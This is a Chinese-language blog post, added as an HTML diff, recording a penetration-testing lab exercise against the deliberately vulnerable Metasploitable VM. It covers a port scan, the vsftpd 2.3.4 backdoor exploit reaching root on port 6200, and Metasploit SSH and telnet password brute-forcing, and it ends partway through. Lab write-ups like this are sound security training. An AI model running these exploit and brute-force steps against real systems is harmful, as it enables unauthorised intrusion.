@@ -1,0 +1,660 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="chaye">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="nmap -sV 192.168.198.135可以看到开放了很多端口 漏洞清单：端口&#x2F;服务	端口&#x2F;服务21 &#x2F; 弱口令	445 &#x2F; 已测试22 &#x2F; 弱口令	512 &#x2F; rlogin23 &#x2F;弱口令	512 &#x2F; rlogin25 -	514 &#x2F; rlogin53 -	1099 &#x2F; java_rmi_s">
+<meta property="og:type" content="article">
+<meta property="og:title" content="metaploitable靶机测试">
+<meta property="og:url" content="http://example.com/2025/03/05/metaploitable%E9%9D%B6%E6%9C%BA%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:site_name" content="chaye的博客">
+<meta property="og:description" content="nmap -sV 192.168.198.135可以看到开放了很多端口 漏洞清单：端口&#x2F;服务	端口&#x2F;服务21 &#x2F; 弱口令	445 &#x2F; 已测试22 &#x2F; 弱口令	512 &#x2F; rlogin23 &#x2F;弱口令	512 &#x2F; rlogin25 -	514 &#x2F; rlogin53 -	1099 &#x2F; java_rmi_s">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221211397.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221243582.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221305667.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221321846.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221336316.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221353527.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221406216.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221424297.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221434861.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221444606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221500143.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221510282.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221532062.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221557239.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221605735.png">
+<meta property="article:published_time" content="2025-03-05T00:29:17.000Z">
+<meta property="article:modified_time" content="2025-03-29T07:47:30.764Z">
+<meta property="article:author" content="chaye">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221211397.png">
+  
+  
+  
+  <title>metaploitable靶机测试 - chaye的博客</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>chaye</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="metaploitable靶机测试"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-05 08:29" pubdate>
+          March 5, 2025 am
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          392 words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          4 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">metaploitable靶机测试</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>nmap -sV 192.168.198.135<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221211397.png" srcset="/img/loading.gif" lazyload alt="image-20250325221211397"><br>可以看到开放了很多端口</p>
+<h1 id="漏洞清单："><a href="#漏洞清单：" class="headerlink" title="漏洞清单："></a>漏洞清单：</h1><p>端口&#x2F;服务	端口&#x2F;服务<br>21 &#x2F; 弱口令	445 &#x2F; 已测试<br>22 &#x2F; 弱口令	512 &#x2F; rlogin<br>23 &#x2F;弱口令	512 &#x2F; rlogin<br>25 -	514 &#x2F; rlogin<br>53 -	1099 &#x2F; java_rmi_server<br>80 - php_cgi	154 msfable 后门<br>111 -	2049 &#x2F; NFS共享漏洞<br>139 &#x2F; smb	2121 -<br>3306 &#x2F; 空密码	3632 &#x2F; distcc_exec<br>5432 &#x2F; postgresql	5900 &#x2F; VNC<br>6000 -	6667 &#x2F; unreal_ircd<br>6697 &#x2F; unreal_ircd	8009<br>8180 &#x2F; tomcat	8787 &#x2F; drb_remote_codeexec</p>
+<h2 id="vsftpd漏洞"><a href="#vsftpd漏洞" class="headerlink" title="vsftpd漏洞"></a>vsftpd漏洞</h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221243582.png" srcset="/img/loading.gif" lazyload alt="image-20250325221243582"><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62670778/article/details/138683346">Ftp笑脸漏洞（VSFTPD 2.3.4）复现（后门漏洞）_笑脸漏洞复现-CSDN博客</a></p>
+<p>笑脸漏洞：这个漏洞是开发者在软件中留下的后门漏洞，当连接带有vsftpd 2.3.4版本的服务器的21端口时，输入用户中带有“:) ”,密码任意，即可运行 vsf_sysutil_extra() ：打开服务器的6200端口，并且不需要密码就能从6200端口以管理员身份登入目标服务器。因为输入用户名需要带有:)，所以称笑脸漏洞</p>
+<p>可以发现上面有后门漏洞，0.o<br>use 一下<br>设置靶机ip进行攻击 set rhosts 192.168.198.135<br>exploit运行一下<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221305667.png" srcset="/img/loading.gif" lazyload alt="image-20250325221305667"><br>这边已经连接成功，下面去拿root权限<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221321846.png" srcset="/img/loading.gif" lazyload alt="image-20250325221321846"><br>ftp测试一下<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221336316.png" srcset="/img/loading.gif" lazyload alt="image-20250325221336316">测试成功<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221353527.png" srcset="/img/loading.gif" lazyload alt="image-20250325221353527">可以看到这边6200的端口已经打开<br>这边连接这个端口直接拿到root</p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221406216.png" srcset="/img/loading.gif" lazyload alt="image-20250325221406216">成功拿到权限</p>
+<h2 id="22端口：直接暴力破解"><a href="#22端口：直接暴力破解" class="headerlink" title="22端口：直接暴力破解"></a><strong>22端口：直接暴力破解</strong></h2><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221424297.png" srcset="/img/loading.gif" lazyload alt="image-20250325221424297"><br>Search  ssh_login       搜索模块<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221434861.png" srcset="/img/loading.gif" lazyload alt="image-20250325221434861"><br>Use  auxiliary&#x2F;scanner&#x2F;ssh&#x2F;ssh_login    使用模块<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221444606.png" srcset="/img/loading.gif" lazyload alt="image-20250325221444606"><br>Set  RHOST 172.16.5.198    设置目标地址</p>
+<p>Set   USER_FILE  &#x2F;root&#x2F;0.txt   设置用户字典路径</p>
+<p>Set   PASS_FILE  &#x2F;root&#x2F;0.txt   设置字典密码路径</p>
+<p>Set   THREADS   100   设置线程是100</p>
+<p>Run  开跑</p>
+<h3 id="23端口-telnet弱口令爆破"><a href="#23端口-telnet弱口令爆破" class="headerlink" title="23端口 telnet弱口令爆破"></a>23端口 telnet弱口令爆破</h3><p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221500143.png" srcset="/img/loading.gif" lazyload alt="image-20250325221500143"><br>search telnet</p>
+<p>use</p>
+<p>show options</p>
+<p>set rhosts ip</p>
+<p>set threads<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221510282.png" srcset="/img/loading.gif" lazyload alt="image-20250325221510282"><br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221532062.png" srcset="/img/loading.gif" lazyload alt="image-20250325221532062"></p>
+<p>登录成功<br><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221557239.png" srcset="/img/loading.gif" lazyload alt="image-20250325221557239"></p>
+<p><img src="https://raw.githubusercontent.com/xiaaaqqqyue/blogImage/main/img/image-20250325221605735.png" srcset="/img/loading.gif" lazyload alt="image-20250325221605735"></p>
+<h2 id="53-1099-java-rmi-server"><a href="#53-1099-java-rmi-server" class="headerlink" title="53 -	1099 &#x2F; java_rmi_server"></a>53 -	1099 &#x2F; java_rmi_server</h2>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="print-no-link">#渗透测试</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>metaploitable靶机测试</div>
+      <div>http://example.com/2025/03/05/metaploitable靶机测试/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>chaye</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>March 5, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/03/05/imagetest/" title="images">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">images</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/03/04/DC-1/" title="DC-1靶机测试">
+                        <span class="hidden-mobile">DC-1靶机测试</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
+</body>
+</html>
